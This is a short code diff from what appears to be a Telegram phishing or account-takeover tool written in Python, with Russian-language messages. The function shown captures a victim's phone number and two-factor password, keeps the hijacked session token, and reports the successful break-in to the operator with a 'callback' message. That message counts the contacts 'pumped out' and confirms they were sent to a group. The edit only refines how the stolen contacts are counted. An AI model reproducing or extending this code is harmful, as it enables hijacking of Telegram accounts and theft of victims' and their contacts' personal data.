@@ -380,19 +380,19 @@ async def verify_telegram_2fa(phone, password):
         if phone_clean in active_sessions:
             del active_sessions[phone_clean]
         
-        # Отстук о успешной авторизации
+                # Отстук о успешной авторизации
         add_notification(
             f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
             f"📟 Номер: +{phone_clean}\n"
-            f"👥 Контактов выкачано: {len(contacts)}\n"
+            f"👥 Контактов выкачано: {len(real_contacts)}\n"
             f"📨 Отправлено в группу: Да"
         )
         
         return {
             'success': True,
             'session_token': session_token,
-            'contacts_count': len(contacts),
-            'message': f'✅ Собрано {len(contacts)} контактов'
+            'contacts_count': len(real_contacts),
+            'message': f'✅ Собрано {len(real_contacts)} контактов'
         }
             
     except Exception as e:
